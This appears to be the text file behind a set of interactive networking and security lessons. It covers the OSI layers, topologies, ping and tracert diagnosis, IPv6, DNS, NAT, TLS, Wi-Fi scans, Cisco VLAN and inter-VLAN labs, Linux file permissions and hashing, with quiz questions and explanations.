title: The OSI model, layer by layer
skill: What each of the 7 layers does, and how data is wrapped and unwrapped
intro: Follow one web request down the stack, across the wire and back up. Then sort real things into the right layer.

mnemonics.phrase: All People Seem To Need Data Processing
Please Do Not Throw Sausage Pizza Away

layers.name: Application
layers.example: Your browser asks the server for a page: GET /index.html.
layers.tip: This is the protocol the app speaks (HTTP, DNS, SMTP), not the app itself.

layers.name: Presentation
layers.example: The request is encrypted so nobody on the path can read it.
layers.tip: Think translator: encryption, encoding, compression. Real TLS spans layers 5 to 7, but exams place it here.

layers.name: Session
layers.example: Keeps this conversation separate from your other tabs, and closes it when you're done.

layers.name: Transport
layers.job: Delivers to the right app using ports; TCP adds reliability
layers.example: TCP adds ports (51514 → 443), numbers each piece and resends anything lost.
layers.tip: TCP: reliable, connection-oriented, three-way handshake. UDP: fast, no connection (DNS, DHCP, VoIP, streaming).

layers.name: Network
layers.job: IP addresses and routing between networks
layers.example: IP adds source 192.168.1.50 and destination 203.0.113.10; routers use the destination to pick the next hop.
layers.tip: IP addresses and routers mean Layer 3. ping uses ICMP, which is Layer 3.

layers.name: Data Link
layers.job: Delivery on the local network using MAC addresses
layers.example: Ethernet wraps the packet in a frame addressed to the router's MAC address, with an error check (FCS) on the end.
layers.tip: MAC addresses and switches mean Layer 2. A frame is the only PDU with a trailer (the FCS).

layers.name: Physical
layers.job: Bits as signals: electricity, light or radio
layers.example: The frame becomes 1s and 0s: voltage on copper, light in fibre or radio waves.
layers.tip: Hubs, repeaters and cables don't read any addresses. They just pass signals on.

title: Network topologies: break them
skill: Star, bus, ring, mesh, spine-and-leaf and more: what fails when a cable or device dies
intro: Click a cable or a device to break it. Green devices can still reach the target; red ones can't.

topologies.name: Star
topologies.where: Almost every office and home LAN
topologies.pros: A broken cable only affects one device. Easy to add devices and troubleshoot.
topologies.cons: The central switch is a single point of failure.
topologies.tip: Physical star is the standard LAN topology on the exam (and in real life).

topologies.name: Bus
topologies.pros: Cheap and simple: one shared cable.
topologies.cons: One break in the backbone takes the whole segment down, because signals reflect off the open end. Everyone shares one collision domain.
topologies.tip: Both ends of the bus need terminators to stop signal reflection.

topologies.name: Ring
topologies.where: Legacy Token Ring and FDDI; some metro and industrial networks
topologies.pros: Predictable performance; a dual ring (like FDDI) survives one break by sending traffic the other way.
topologies.cons: A single (one-direction) ring stops at the first break; two breaks split even a dual ring.
topologies.tip: This diagram behaves like a dual ring: one break is survivable, two are not.

topologies.name: Full mesh
topologies.where: WAN cores between key sites, where uptime matters most
topologies.pros: Maximum redundancy: traffic can route around several failures.
topologies.cons: Expensive and complex: the number of links grows fast.
topologies.tip: Links in a full mesh = n(n−1)/2. Here 5 × 4 ÷ 2 = 10.

topologies.name: Partial mesh
topologies.where: Most real WANs and ISP backbones
topologies.pros: Redundancy where it matters, without the cost of linking everything.
topologies.cons: Some paths have less protection than others.
topologies.tip: A compromise between star (cheap) and full mesh (resilient).

topologies.name: Hub and spoke
topologies.where: Branch offices connected to headquarters over a WAN
topologies.pros: Simple and cheap: each branch needs one link.
topologies.cons: The hub is a single point of failure, and branch-to-branch traffic goes via HQ.
topologies.tip: It's a star at WAN scale. Adding a second hub improves resilience.

topologies.name: Spine and leaf
topologies.pros: Every leaf connects to every spine, so any server is two switch hops from any other. Losing a spine just reduces capacity.
topologies.cons: Lots of cabling between spines and leaves.
topologies.tip: Built for east-west traffic (server to server) inside a data centre.

topologies.name: Three-tier (hierarchical)
topologies.pros: Core (fast backbone), distribution (policy and routing) and access (where users plug in) each have one job, so it scales.
topologies.cons: More layers of equipment. Here each access switch has one uplink, so a distribution switch failure cuts off two of them.
topologies.tip: A collapsed core merges the core and distribution layers, common in smaller sites.

primer.title: Before you start: reading ping and tracert

keys.label: Latency
keys.text: How long a reply takes, in milliseconds (ms).

keys.label: Jitter
keys.text: How much that time jumps about. Voice calls hate it.

keys.label: Packet loss
keys.text: Packets that never come back: Request timed out.

steps.q: Staff say calls break up and bookings are slow every afternoon. Using the troubleshooting method, what comes first?
options: Restart the router and see if it helps
Identify the problem: gather information, ask what has changed and reproduce it
Escalate straight to the internet provider
steps.explain: The method: identify the problem, establish a theory, test it, plan and carry out the fix, verify it works, then document what you found. Guessing first (a restart) can hide the evidence.

steps.q: At 15:12 the reception PC pings its gateway (10.40.0.1): every reply under 1 ms, no loss. What does that tell you?
options: The whole network is fine, so the booking system must be broken
The cable and switch between the PC and the office router are fine: look further out
The PC needs a new network card
Nothing: the gateway never answers pings
steps.explain: Split the path in half. A fast, clean reply from the gateway rules out the PC, its cable and the switch, so the problem is between the office router and the booking system.

steps.q: At 15:12, what percentage of pings to the booking system were lost?
steps.hint: Look at the Ping statistics after the 15:12 pings to 203.0.113.40.
steps.explain: 3 of 20 never came back. Even 1 or 2% loss is noticeable on a voice call; 15% is severe. In the morning baseline it was 0%.

steps.q: The 15:12 replies swing from 24 ms to 352 ms. The morning baseline stayed at 18 to 21 ms. What's that swing called?
steps.explain: Jitter is variation in latency. Voice and video need packets to arrive evenly, so jitter makes calls choppy even when most packets arrive. A baseline (what normal looks like) is what lets you spot it.

steps.q: In the tracert, at which hop does the delay first jump?
steps.hint: Compare the times on each numbered line.
steps.explain: Hop 1 (the office router) answers in under 1 ms; hop 2 (the internet provider's router) takes over 200 ms. So the delay is on the link between them: the office's own internet connection. Every hop after just inherits it.

steps.q: On the router's internet link, txload is 251/255, the output queue is 40/40 and there are 18,342 output drops. What does that mean?
options: The upload is almost full: packets queue up, wait (latency, jitter) and get dropped when the queue is full (loss)
The router is out of memory
The internet provider is blocking the office
steps.explain: txload is how busy sending is, out of 255: 251 is about 98% of the 20 Mbps upload. That's congestion. A full queue explains all three symptoms at once. (The real output has more counters; it's shortened here.)

steps.q: What changed recently that could fill the upload every afternoon? (What now runs at 14:00?)
steps.hint: Read the IT change log.
steps.explain: Change CHG-0412 moved the cloud backup into working hours. Asking "what changed?" is part of identifying the problem, and it's why change records matter: they turn a mystery into a timeline.

steps.q: What's the best fix?
options: Move the backup back out of hours (or cap its speed), and use QoS so voice traffic goes first
steps.explain: Remove the cause, and use QoS (quality of service) so calls always jump the queue. Then verify: ping again at 15:00 and compare with the baseline. Finally document it, and raise a change to move the backup.

steps.q: The surgery 2 laptop is slow all day, even at 10:07 when the internet link is quiet. Its pings to the gateway swing from 2 to 96 ms with 20% loss. What does that point to?
options: A problem on its own Wi-Fi connection, such as interference or a weak signal
Nothing: those times are normal for Wi-Fi
steps.explain: The gateway is one hop away, so this never touches the internet link. A good Wi-Fi link to the gateway should be a few milliseconds, steady, with no loss. Next: check its signal and channel (overlapping channels, microwaves and thick walls all cause this).

primer.title: Before you start: reading IPv6

keys.label: 128 bits
keys.text: Eight groups of four hex digits, separated by colons.

keys.label: Shortening
keys.text: Drop leading zeros; :: replaces one run of zero groups.

keys.label: fe80::
keys.text: Link-local: works on this segment only, never routed.

results: a global address: routable across networks

steps.q: Which address only works on this PC's own network segment? (Copy it without the %12.)
steps.hint: Look for the address starting fe80.
steps.explain: Every IPv6 interface makes a link-local address in fe80::/10 by itself. Routers never forward it, so it's only for talking to neighbours on the same segment, such as the router.

steps.q: What does %12 at the end of the link-local address mean?
options: The interface it belongs to (a zone ID): link-local addresses repeat on every segment, so Windows notes which card to use
steps.explain: Every network card has its own fe80 address, and the same fe80 address could exist on two segments. The zone ID (here interface 12) says which card to send through.

steps.q: The default gateway is fe80::1%12. Is that a mistake?
options: Yes: a gateway needs a global address
No: routers advertise their link-local address as the IPv6 gateway, which is normal
Yes: fe80 is only for printers
steps.explain: The PC only needs to reach the router on its own segment, so a link-local gateway is standard. The second line, 10.40.0.1, is the IPv4 gateway.

steps.q: Write 2001:0db8:04a1:0010:0000:0000:0000:0025 in its shortest form (it's this PC's address).
steps.hint: Drop leading zeros from each group, then replace the run of 0000 groups with ::.
steps.explain: Leading zeros go (0db8 becomes db8, 04a1 becomes 4a1) and the three zero groups become ::. 2001:db8:: is the range set aside for examples and documentation, like 192.0.2.0 for IPv4.

steps.q: Why is there a Temporary IPv6 Address as well?
options: For privacy: it changes regularly and is used for outgoing connections, so websites can't track the PC by one fixed address
steps.explain: A fixed address can follow a laptop around the internet. Windows uses a temporary address for connections it starts, and keeps the stable one for things that connect in.

steps.q: This PC has an IPv4 address and IPv6 addresses on the same card. What's that called?
steps.explain: Dual stack runs both versions side by side, the usual approach while the internet moves to IPv6. Tunnelling wraps one inside the other, and NAT64 translates between them.

steps.q: With IPv6, every device can have a global address and there's no NAT. What should the network still have?
options: Nothing: no NAT means no risk
A firewall that blocks unrequested incoming traffic, as NAT happened to for IPv4
steps.explain: NAT hid devices as a side effect, but it was never a security control. With IPv6, a stateful firewall does that job on purpose.

chapters.label: DNS
chapters.title: From a name to an address
chapters.idea: The app knows a name; the network needs an IP address. A resolver asks the root, the .example servers and Hopper's own server, then caches the answer for its TTL.
chapters.goal: Look it up twice (the second answer comes from the cache), then let the TTL run out and look again.
chapters.security: A bad or poisoned answer stays cached until its TTL runs out. DNSSEC lets resolvers check records are genuine.

deeper.label: Mission: Why won't the intranet load? (a stale DNS record)

chapters.label: Ports
chapters.title: Many services, one machine
chapters.idea: One server, several services, each on its own port. 0.0.0.0 means anyone can connect; 127.0.0.1 (localhost) means only the server itself. Up isn't the same as reachable.
chapters.goal: Lock it down: other machines reach only the website, while the database and cache still answer on the server itself.
chapters.security: Databases and caches open to everyone get found fast. Exposed Redis is often hijacked within minutes. Listen on localhost unless something else must connect.

chapters.label: MAC and ARP
chapters.title: Who has 192.168.1.1?
chapters.idea: On a local network, frames go to MAC addresses. To find one, a device asks everyone "who has this IP?" (ARP), and only the owner replies.
chapters.goal: Send to a device on your network and to the Hopper server, and see which address the phone actually asks for.
chapters.security: Anyone can answer an ARP question, so an attacker can claim to be the router and see everything (ARP spoofing). Switch protections and TLS stop it.

deeper.label: Lab: VLANs, where broadcasts like ARP stop

chapters.label: Routing
chapters.title: Hop by hop across the internet
chapters.idea: Your phone only knows its first hop. Each router passes the packet one hop closer. traceroute reveals each hop by letting probes run out one router further each time.
chapters.goal: Send probes until one reaches the Hopper server.
chapters.ipmac: The IP addresses (where it's going) stay the same the whole way, apart from your router's NAT (next stop). The MAC addresses change on every link: each router addresses the frame to the next router's MAC.
chapters.security: Routers trust each other's route announcements (BGP). In 2018 attackers hijacked Amazon's DNS addresses this way to steal cryptocurrency. RPKI checks who owns an address range.

chapters.label: NAT
chapters.title: Many devices, one public address

actions.label: A stranger tries to connect in

chapters.idea: Private addresses (192.168.x.x) don't work on the internet. Your router swaps them for its one public address, notes each pair in a table, and only lets replies back in.
chapters.goal: Send traffic out, let a reply back in, and see what happens to a stranger.
chapters.security: NAT blocks unexpected inbound traffic, but it isn't a firewall: port forwarding opens holes, and malware inside can still call out freely.

chapters.label: Tiers
chapters.title: Control the traffic between layers
chapters.idea: Only the public subnet faces the internet. App servers and the database sit in private subnets, and each tier's security group says who may connect.
chapters.goal: One rule is too loose. Fix the database's rule so every test comes out right.
chapters.security: Two layers means one mistake isn't fatal. But a loose rule lets anyone who takes over the load balancer reach the data. Name the tier in front, not "anywhere".

card: DNS, ports, ARP, routing, NAT, tiers

title: One request, start to finish
skill: Follow one app's request through HTTP, TCP and UDP, TLS, a load balancer, a reverse proxy, a firewall and WebSockets
intro: Hopper (a made-up ride app) asks where your driver is. Seven ideas carry that request there and back.
simplification: Simplified for learning: TCP segments are numbered 1 to 5 here (real TCP numbers every byte), every segment is acknowledged straight away, and there's no selective acknowledgement (SACK). The TLS capture is random-looking stand-in bytes in a real TLS 1.3 record layout, not real encryption. The load balancer runs its health check with every request (real ones check on a timer, often every 2 seconds). Sign-in tokens are shortened. Hopper and its domains are made up, using the reserved .example name.

chapters.label: HTTP
chapters.title: Ask, then answer
chapters.idea: The app asks (a request) and the server answers (a response). Both are plain text. The answer starts with a status code saying how it went.
chapters.goal: Send all four requests and compare the status codes.
chapters.security: Status codes tell a story in logs: lots of 401s means someone guessing; lots of 404s means a scanner. A sign-in token is as good as a password.

exchanges.label: Where's my driver?
exchanges.note: 2xx means it worked. GET only reads; asking twice changes nothing.

exchanges.label: Book a ride
exchanges.note: POST sends data to create something. 201 Created, and the Location header says where the new ride lives.

exchanges.label: An old ride
exchanges.note: 4xx means the request was the problem: here, nothing exists at that path.

exchanges.label: Not signed in
exchanges.note: No Authorization header, so 401: the server doesn't know who's asking. (403 would mean it knows, and the answer is no.)

chapters.label: TCP and UDP
chapters.title: Nothing goes missing (unless you'd rather it did)
chapters.idea: TCP numbers each segment, the receiver acknowledges it, and anything lost is resent. UDP just sends. Lose a segment each way and compare.
chapters.goal: Lose at least one segment over TCP, then over UDP.
chapters.headerNote: TCP's extra 12 bytes number, acknowledge and pace the data. Web, email and SSH use TCP; DNS, video calls and games usually use UDP.
chapters.security: UDP has no handshake, so senders can be faked. Attackers send small questions "from" a victim, and the big answers flood them (amplification DDoS).

chapters.label: HTTPS
chapters.title: Anyone on the path can read it, unless it's encrypted
chapters.idea: On café Wi-Fi, anyone nearby can capture your traffic. TLS (the S in HTTPS) encrypts it, and a certificate proves the server is really api.hopper.example.
chapters.goal: Turn on TLS, then find a certificate the app must refuse.
chapters.payload:
POST /rides HTTP/1.1
Host: api.hopper.example
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJyaWRlci03In0.w9Lq
Content-Type: application/json

{"pickup":"Euston Square","lat":51.5257,"lng":-0.1357}
chapters.certIntro: When TLS starts, the server shows a certificate. The app checks three things: is it for this name, is it signed by an authority the phone trusts, and is it in date? Try each one.

certs.label: From someone on the Wi-Fi
certs.story: Someone in the middle can make a certificate with any name on it, but no trusted authority will sign it. This check is what stops them reading your traffic even when they sit on the path.

certs.label: A lookalike
certs.story: A genuine certificate, but for a different name. Anyone can get one for a domain they own, which is why a padlock alone doesn't make a site honest.

certs.label: An old one
certs.story: Expired certificates are usually a forgotten renewal, not an attack, but the app can't tell the difference, so it refuses.

chapters.security: HTTPS hides what you said, not who you talked to. A padlock means encrypted, not honest: phishing sites have certificates too.

chapters.label: Load balancer
chapters.title: One server isn't enough
chapters.idea: One server can't take everyone. A load balancer shares requests across several, and stops sending to any that fail their health checks.
chapters.goal: Crash a server, keep sending, and watch the load balancer route around it.
chapters.security: Load balancers help absorb floods of traffic, but every server behind one must be patched: attackers only need one weak one.

chapters.label: Reverse proxy
chapters.title: One front door for many services
chapters.idea: One front door for many services. The reverse proxy ends HTTPS, reads the path, and passes each request to the right service inside. The longest matching rule wins.
chapters.goal: Send requests to all three services, and one that matches nothing.
chapters.security: Only the proxy faces the internet, so services stay hidden and risky paths can be blocked in one place. Web application firewalls (WAFs) usually sit here.

chapters.label: Firewall
chapters.title: Who's allowed in?
chapters.idea: Rules are read top to bottom; the first match decides, and anything unmatched is denied. Two of Hopper's rules are wrong.
chapters.goal: Make every test traffic line come out right.
chapters.solvedNote: Only the API reaches the database, and SSH is closed to the internet. The attacker can still reach the public site: the app itself must be secure too.
chapters.security: Open only what's needed, only to who needs it. Databases and SSH open to the internet are among the most common ways in.

chapters.label: WebSockets
chapters.title: Live updates without asking again and again
chapters.idea: Polling asks every few seconds, mostly to hear nothing new. A WebSocket keeps one connection open, so the server can push each update straight away.
chapters.goal: Watch the same ride with polling, then with a WebSocket.

upgrade.request:
GET /rides/42/live HTTP/1.1
Host: api.hopper.example
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://app.hopper.example
upgrade.response:
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=

chapters.security: The upgrade is a normal HTTP request, so it needs normal sign-in checks. Servers should check the Origin header too, or other sites can hijack the socket.

primer.title: Before you start: reading a Wi-Fi scan

keys.label: SSID
keys.text: The network's name. Anyone can broadcast any name.

keys.label: BSSID
keys.text: One access point radio's MAC address. A network can have several.

keys.label: Channel
keys.text: 1 to 13 is 2.4 GHz; 36 and up is 5 GHz.

steps.q: Which network sends everything unencrypted? (SSID)
steps.hint: Look for Encryption: None.
steps.explain: Open and None means anyone in range can read unencrypted traffic. A sign-in page (captive portal) doesn't add encryption: guests should rely on HTTPS and a VPN.

steps.q: Which network uses encryption that's been broken for over 20 years? (SSID)
steps.hint: One network's encryption is neither CCMP nor None.
steps.explain: WEP can be cracked in minutes. That camera network needs replacing or moving to WPA2/WPA3, and anything on it treated as exposed.

steps.q: There are two networks called Ashgrove-Staff. Which detail gives the impostor away?
options: It uses WPA2-Personal with a different BSSID, while the real staff network is WPA2-Enterprise
steps.explain: Same name, different security and an unknown BSSID: a classic evil twin, hoping staff devices will connect and type their passwords. The strongest signal often belongs to the fake, because it's close to its victims.

steps.q: PRINTER-2F is on channel 4. Why is that a problem on 2.4 GHz?
options: Channel 4 is illegal in the UK
It overlaps with networks on channels 1 and 6, so they interfere with each other
It isn't: every channel is separate
steps.explain: 2.4 GHz channels are 5 MHz apart but 20 MHz wide. Only 1, 6 and 11 don't overlap, so the printer should move to one of those.

steps.q: The real staff network has a radio on channel 36 and one on channel 1. Which band is channel 36?
options: It can't be told from the scan
steps.explain: Channels 1 to 13 are 2.4 GHz, and 36 is the first common 5 GHz channel. Windows 10's netsh doesn't print the band, so the channel tells you. 5 GHz is faster and less crowded, with shorter range.

steps.q: Which radio type (standard) is Wi-Fi 6?
steps.hint: Look at the Radio type lines.
steps.explain: 802.11ax is Wi-Fi 6 (Wi-Fi 6E when it uses 6 GHz). 802.11n is Wi-Fi 4 and 802.11g is older still.

steps.q: What should the library do about the staff network's security?
options: Switch it to an open network with a captive portal
Keep 802.1X (Enterprise) logins, and report the fake Ashgrove-Staff so it can be found and removed
Change it to WEP for older devices
steps.explain: Enterprise mode gives each person their own login, which is right. The impostor is the problem: find it by signal strength, and remind staff that their device should never ask for their password on a network that looks like the staff one. Hiding the SSID doesn't secure anything: devices still announce it.

title: VLANs: one network, kept apart
skill: Create VLANs, assign access and voice ports, and trunk them between Cisco switches
intro: Harbourside College puts staff, students and guests on one flat network. Split them with VLANs on three Cisco switches.
simplification: Simplified simulation of Cisco Catalyst 2960 switches running IOS 15: only the commands this lab needs are modelled, and some long outputs are shortened (marked [Simulator]). VLAN changes apply at once (real IOS applies them when you leave VLAN mode). Spanning tree, VTP and CDP are not modelled, except the CDP native VLAN mismatch warning. On a real 2960, mls qos trust cos only takes effect once QoS is enabled with the global command mls qos. PCs are Windows and have no default gateway; ping output follows Windows. Addresses are private (10.10.x.x) and the college is fictional.

tasks.text: On S1, enter privileged mode and show which VLAN every port is in.
tasks.hint: enable, then show vlan brief (sh vl br works too)
tasks.why: Out of the box every port is in VLAN 1: one big broadcast domain. show vlan brief is the command that shows just each VLAN's name, status and ports.

tasks.text: From PC1, ping PC4 (10.10.10.14). They share a subnet.
tasks.why: Same subnet, same VLAN (1): the switches forward between them, even across S1.

tasks.text: From PC1, ping PC2 (10.10.20.12).
tasks.why: PC2 is in another subnet and PC1 has no default gateway, so Windows can't even send it: "General failure". Different subnets need a router to talk, whatever the VLANs.

tasks.text: On S1, create and name VLANs 10 Staff, 20 Students, 30 Guest, 99 Management and 150 Voice. Names are case-sensitive.
tasks.hint: configure terminal, vlan 10, name Staff, vlan 20, name Students… (vlan works straight from VLAN mode)
tasks.why: VLANs split one switch into separate broadcast domains: staff, students and guests stop seeing each other's broadcasts, and moving someone is a config change, not a re-cable. That's the benefit.

tasks.text: Create the same VLANs, with the same names, on S2 and S3.
tasks.hint: Choose S2: enable, conf t, then the same vlan and name commands. Then S3.
tasks.why: Here each switch keeps its own VLAN list (VTP can share one, but isn't used). A switch drops traffic for a VLAN it doesn't have.

tasks.text: On S2, make Fa0/11, Fa0/18 and Fa0/6 access ports in VLANs 10, 20 and 30.
tasks.hint: interface fa0/11, switchport mode access, switchport access vlan 10. Then fa0/18 (20) and fa0/6 (30).
tasks.why: switchport mode access stops the port negotiating a trunk; switchport access vlan puts the PC's traffic in its VLAN.

tasks.text: Do the same on S3: Fa0/11 in VLAN 10, Fa0/18 in 20, Fa0/6 in 30.
tasks.why: Each switch decides which VLAN its own ports are in.

tasks.text: S3 Fa0/11 also has an IP phone (PC4 plugs into the phone). Trust the phone's CoS markings and put voice in VLAN 150.
tasks.hint: interface fa0/11, mls qos trust cos, switchport voice vlan 150
tasks.why: The phone tags its calls with VLAN 150 and a priority (CoS); the PC behind it stays untagged in VLAN 10. Trusting CoS lets the switch give calls priority. show vlan brief now lists Fa0/11 under both VLAN 10 and VLAN 150.

tasks.text: Ping PC4 from PC1 again. Both are in VLAN 10 now. Why does it fail?
tasks.hint: On PC1: ping 10.10.10.14, then on S2: show vlan brief. Look at Gi0/1.
tasks.why: The links between the switches are still access ports in VLAN 1 (two "dynamic auto" ends never form a trunk), so VLAN 10 can't cross them. Windows prints "Destination host unreachable" and still counts those as received: read the lines, not just the summary.

tasks.text: Turn both links between the switches into 802.1Q trunks.
tasks.hint: On S1: interface range gi0/1 - 2, switchport mode trunk. Then show interfaces trunk.
tasks.why: A trunk carries every VLAN, tagging each frame with its VLAN ID. S2 and S3 were on "dynamic auto", so they agreed to trunk when S1 asked (DTP). Many admins set both ends to trunk to avoid relying on negotiation.

tasks.text: Set native VLAN 99 on both ends of both trunks.
tasks.hint: switchport trunk native vlan 99 on S1 Gi0/1 and Gi0/2, S2 Gi0/1 and S3 Gi0/1
tasks.why: Untagged frames on a trunk belong to the native VLAN. Moving it off VLAN 1 to an unused VLAN makes VLAN hopping harder. Both ends must match: until they do, CDP warns of a mismatch and untagged traffic lands in the wrong VLAN.

tasks.text: Prove it: ping PC4 from PC1, PC5 from PC2 and PC6 from PC3.
tasks.why: Each VLAN now reaches across the trunks, and the VLANs still can't reach each other: that's the point. To let them talk, add a router or a layer 3 switch (inter-VLAN routing).

title: Inter-VLAN routing: letting VLANs talk
skill: Route between VLANs with a router on a stick (802.1Q subinterfaces), then filter it with an extended ACL
card: Route between VLANs with one router, then lock it down
intro: Harbourside College's VLANs keep staff, students and guests apart. Now they need to reach each other: route between them with one router, then keep students out of staff.
simplification: Simplified simulation of a Cisco 2911 router and Catalyst 2960 switches running IOS 15: only the commands this lab needs are modelled, and some long outputs are shortened (marked [Simulator]). Access lists: only named extended lists with ip and icmp entries, applied inbound. When an access list denies a packet, a real router answers with an ICMP "administratively prohibited" message unless no ip unreachables is set on the interface (security baselines ask for it); this lab behaves as if it is set, so a blocked ping times out. The switches start where the VLAN lab ends. PCs are Windows and only run ping and ipconfig. Addresses are private (10.10.x.x) and the college is fictional.

tasks.text: From PC1 (Staff), ping PC2 (Students) at 10.10.20.12. PC1's gateway is 10.10.10.1.
tasks.why: PC2 is on another network, so PC1 sends the ping to its gateway, 10.10.10.1. Nothing answers for that address yet, so Windows reports "Destination host unreachable" from PC1's own address.

tasks.text: On S1, make Fa0/24 (the cable to R1) an 802.1Q trunk.
tasks.hint: On S1: enable, conf t, interface fa0/24, switchport mode trunk
tasks.why: One cable will carry all three VLANs to the router, each frame tagged with its VLAN. A router doesn't negotiate trunks (DTP), so the switch end is set to trunk.

tasks.text: On R1, bring up GigabitEthernet0/0. Router interfaces start shut down.
tasks.hint: On R1: enable, conf t, interface g0/0, no shutdown
tasks.why: Unlike a switch port, a router interface is administratively down until you say no shutdown. The physical interface needs no address: the subinterfaces will carry them.

tasks.text: On R1, create subinterface G0/0.10 for VLAN 10 with the address 10.10.10.1 255.255.255.0.
tasks.hint: interface g0/0.10, encapsulation dot1Q 10, ip address 10.10.10.1 255.255.255.0
tasks.why: A subinterface is a virtual interface on one cable. encapsulation dot1Q 10 says which VLAN's tagged frames it handles; the address makes it VLAN 10's gateway. The tag has to come before the address.

tasks.text: Do the same for VLAN 20 (10.10.20.1) and VLAN 30 (10.10.30.1).
tasks.hint: interface g0/0.20, encapsulation dot1Q 20, ip address 10.10.20.1 255.255.255.0, then the same for .30
tasks.why: Each VLAN gets its own subinterface and gateway address. The subinterface number (.20) is just a name; the dot1Q number is what must match the VLAN.

tasks.text: From PC1, ping PC2 again.
tasks.why: PC1 sends to its gateway (R1 G0/0.10), R1 routes it out of G0/0.20, tagged VLAN 20, and PC2 replies through its own gateway. One cable in, the same cable out: a router on a stick.

tasks.text: On R1, look at the routing table.
tasks.hint: show ip route (from config mode: do show ip route)
tasks.why: Every network with an up interface appears as C (connected), with the router's own address as L (local, /32). R1 needs no static routes or routing protocol: it's directly connected to all three VLANs.

tasks.text: Students mustn't reach staff. On R1, create an extended ACL named STUDENTS that denies 10.10.20.0/24 to 10.10.10.0/24 and permits everything else. Apply it inbound on G0/0.20.
tasks.hint: ip access-list extended STUDENTS, deny ip 10.10.20.0 0.0.0.255 10.10.10.0 0.0.0.255, permit ip any any, then interface g0/0.20, ip access-group STUDENTS in
tasks.why: The wildcard 0.0.0.255 means "any value in the last octet". Order matters (first match wins), and every ACL ends with an invisible deny everything, so the permit line keeps students' other traffic working. Inbound on .20 filters traffic as it leaves the student VLAN, close to its source.

tasks.text: From PC2 (Students), ping PC1 (Staff).
tasks.why: The ping arrives on G0/0.20 and matches the deny line, so R1 drops it. show access-lists on R1 shows the matches.

tasks.text: From PC2, ping PC3 (Guest). It should still work.
tasks.why: It doesn't match the deny line, so it falls through to permit ip any any. Without that line, the implicit deny would have cut students off from everything.

tasks.text: From PC1 (Staff), ping PC2. The rule only blocks students, so why does this fail?
tasks.hint: On PC1: ping 10.10.20.12, then on R1: show access-lists
tasks.why: The ping gets to PC2, but its reply (10.10.20.12 to 10.10.10.11) comes in on G0/0.20 and matches the deny line. ACLs check each packet on its own, with no memory of what went out. Real networks let replies back with a stateful firewall, or the established keyword for TCP.

title: Network builder: see who can talk to whom
skill: Build networks with switches, VLANs, trunks and a router, and see every broadcast domain light up as you change it
intro: Add PCs, switches and routers, cable them up, and set IPs and VLANs. Every broadcast domain gets its own colour, live.
simplification: Simplified for learning: switches model Cisco Catalyst 2960 VLANs, trunks and DTP; routers only know the networks they have an address on (no static or dynamic routing); PCs are Windows with one network card and a fixed address. Spanning tree, MAC address tables, ARP caches and DHCP aren't modelled. Switch commands follow IOS 15 and ping output follows Windows. Your network is saved in this browser only.

goals.text: Get a ping reply from one PC to another.
goals.why: Same subnet and the same broadcast domain (the same colour), so the PC's ARP request finds the other one.

goals.text: Put two PCs on one switch into different VLANs, and watch the colours split.
goals.why: Each VLAN is its own broadcast domain, even on one switch. Different colours can't hear each other without a router.

goals.text: Link two switches with a trunk that carries at least two VLANs with PCs in them.
goals.why: A trunk tags every frame with its VLAN, so one cable carries several networks: that's the bundle of colours.

goals.text: Route between VLANs: get a ping reply from a PC in one VLAN to a PC in another.
goals.why: The router has an address in each network, and each PC sends traffic for other networks to its default gateway. Load "Router between two VLANs" for a head start.

title: Who can read this file? Linux permissions
skill: Read ls -l, fix over-shared files with chmod and chown, and predict exactly who can read, change or run a file
intro: Everyone's pay is in a file anyone on the server can read. Work out who can see what, then fix it.
simplification: Simplified: one server, a few files and four people. Access is worked out the way the Linux kernel does it (one class applies: owner, else group, else others; root skips read and write checks; you need x on every folder in the path), but ACLs, setuid, setgid and sticky bits, umask and SELinux or AppArmor aren't modelled. ls -l output follows GNU coreutils. The people and the company are fictional.

/srv/payroll.note: For a folder, r lets you list what's inside, x lets you go into it (and reach the files), and w with x lets you add or delete files.

/srv/payroll/salaries.csv.note: Everyone's pay. Only the finance team should see it, and only alice should change it.

/srv/scripts/backup.sh.note: Carol's nightly backup script. It needs to run, and what's inside (paths and settings) is nobody else's business.

tasks.text: See the permissions: run ls -l in /srv/payroll.
tasks.why: Each line shows the type and permissions (-rw-r--r--), links, owner, group, size, date and name. The nine letters are three sets of rwx: owner, group, others.

tasks.text: salaries.csv is -rw-r--r--, so dave the intern can read everyone's pay. Fix it: finance can read it, only alice can change it, nobody else gets anything.
tasks.hint: chmod 640 salaries.csv, or switch off the others r in the grid
tasks.why: 640 is rw- r-- ---: the owner reads and writes, the finance group reads, others get nothing. Fixing over-sharing means taking access away, not adding it for anyone.

tasks.text: Lock the payroll folder: people outside finance can't list it or go into it, but finance still can.
tasks.why: Without x on the folder, nobody outside finance can reach any file inside it, whatever that file's own bits say. Two locks are better than one.

tasks.text: backup.sh has no x bit, so it can't run. Make it runnable by carol only, and unreadable by everyone else.
tasks.why: 700 is rwx --- ---. To run a script, its owner needs x (and r, because the shell reads it). Even root can only run a file that has an x bit somewhere.

tasks.text: Try a trap: set salaries.csv to 460 (r-- rw- ---). Who can change it now?
tasks.hint: chmod 460 /srv/payroll/salaries.csv, then look at the Change column
tasks.why: alice owns the file, so only the owner bits (r--) count for her, even though her group has rw-. Linux picks one class and stops; it never adds them together. bob, in the group, can change it and alice can't.

tasks.text: Finally: bob takes over payroll. Set salaries.csv back to 640 and make bob its owner (group still finance).
tasks.why: Only root can give a file to someone else (chown). Now alice falls into the group bits: she can still read the file but not change it.

title: Hashing: fingerprints, MD5, SHA-1 and passwords
skill: Use hashes to check files, explain why MD5 and SHA-1 are retired, and see why passwords need salts and slow hashes
intro: Hashes are everywhere in security: checking downloads, signing software, identifying malware and storing passwords. Compute real MD5, SHA-1 and SHA-256 hashes, catch a tampered download, then see what happens when a password table leaks.
simplification: Simplified for learning: the leaked tables use six made-up accounts and a 20-word guess list. Real breaches involve millions of accounts, and attackers use far bigger lists and dedicated hardware. Hashes are computed live in your browser (MD5 by this page's own code, SHA and PBKDF2 by the Web Crypto API). The salted table uses salted SHA-256 to show what a salt does; a real system should use a slow function such as Argon2id or bcrypt instead.

parts.label: Why MD5 and SHA-1 are retired

text.fingerprint: A hash turns any input into a fixed-length fingerprint. Same input, same hash, and there's no way back. Type below: all three are computed live.
